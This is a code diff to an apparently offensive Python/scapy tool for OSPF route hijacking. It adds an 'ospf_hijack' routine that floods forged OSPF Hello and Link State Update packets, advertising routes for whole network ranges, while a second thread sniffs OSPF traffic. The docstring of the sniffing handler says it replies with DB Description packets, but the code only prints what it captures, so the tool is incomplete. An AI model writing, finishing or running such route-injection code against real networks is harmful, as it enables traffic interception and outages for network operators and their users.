@@ -7,6 +7,7 @@ from time import sleep
 from scapy.contrib.ospf import *
 from scapy.all import *
 from netaddr import IPNetwork
+from threading import Thread
 
 # Only transit should be used in this tool. This dictionary just gives the numbers meaning
 OSPF_Router_LSA_types = {
@@ -17,7 +18,7 @@ OSPF_Router_LSA_types = {
 }
 
 MY_IP = IP().src
-ADVERTISE_IP = '224.0.0.5'
+ADVERTISE_IP = '127.0.0.1'
 
 # FOR TESTING
 TEST_NETWORKS = [
@@ -33,19 +34,19 @@ def generate_lsa_list(networks: List[str], src_ip=MY_IP, metric=0):
   Parameters
   -----------
   networks: List[str]
-      List of network addresses in CIDR notation
+    List of network addresses in CIDR notation
   """
   lsalist = []
   for network in networks:
-      ip_range = IPNetwork(network)
-      for ip_addr in ip_range.iter_hosts():
-          lsalist.append(
-              OSPF_Router_LSA(id=src_ip, adrouter=src_ip, linklist=[
-                  OSPF_Link(id=ip_addr, data='255.255.255.255',
-                            metric=metric,
-                            type=OSPF_Router_LSA_types['transit'])
-              ])
-          )
+    ip_range = IPNetwork(network)
+    for ip_addr in ip_range.iter_hosts():
+      lsalist.append(
+        OSPF_Router_LSA(id=src_ip, adrouter=src_ip, linklist=[
+          OSPF_Link(id=ip_addr, data='255.255.255.255',
+                    metric=metric,
+                    type=OSPF_Router_LSA_types['transit'])
+          ])
+      )
 
   return lsalist
 
@@ -58,26 +59,64 @@ def spam_hello_and_advertisements(*, networks: List[str], interval=0.5):
   Parameters
   -----------
   networks: List[str]
-      List of network addresses in CIDR notation
+    List of network addresses in CIDR notation
 
   interval: number
-      Interval in seconds to spam packets
+    Interval in seconds to spam packets
   """
 
   lsalist = generate_lsa_list(networks)
 
   print('Spamming hello and LSUpdate packets.')
   while True:
-      hello_packet = IP(dst=ADVERTISE_IP) / \
-          OSPF_Hdr(src=MY_IP) / OSPF_Hello()
-      send(hello_packet, verbose=False)
+    hello_packet = IP(dst=ADVERTISE_IP) / OSPF_Hdr(src=MY_IP) / OSPF_Hello()
+    send(hello_packet, verbose=False)
 
-      update_packet = IP(dst=ADVERTISE_IP) / \
-          OSPF_Hdr(src=MY_IP) / OSPF_LSUpd(lsalist=lsalist)
-      send(update_packet, verbose=False)
+    update_packet = IP(dst=ADVERTISE_IP) / \
+      OSPF_Hdr(src=MY_IP) / OSPF_LSUpd(lsalist=lsalist)
+    send(update_packet, verbose=False)
 
-      sleep(interval)
+    sleep(interval)
 
+
+def handle_ospf_handshake():
+  """
+  Sniffs for OSPF packets, replying to Hello Packets with a DB Description packet.
+  """
+  def handle(packet: Packet):
+    if 'OSPF' in packet:
+      print(packet)
+
+  sniff(prn=handle)
+
+
+def ospf_hijack(*, networks: List[str]):
+  """
+  Given a list of network addresses specified in CIDR notation,
+  flood those networks with OSPF Hello packets and LSA updates.
+
+  Parameters
+  -----------
+  networks: List[str]
+    List of network addresses in CIDR notation
+  """
+  spam_hellos_thread = Thread(
+    target=spam_hello_and_advertisements,
+    daemon=True,
+    kwargs={"networks": networks}
+  )
+  spam_hellos_thread.start()
+
+  ospf_sniff_thread = Thread(
+    target=handle_ospf_handshake,
+    daemon=True
+  )
+
+  ospf_sniff_thread.start()
+
+  # Keep the script running until Ctrl+C is pressed
+  while True:
+    sleep(1)
 
 if __name__ == '__main__':
-  spam_hello_and_advertisements(networks=TEST_NETWORKS)
+  ospf_hijack(networks=TEST_NETWORKS)
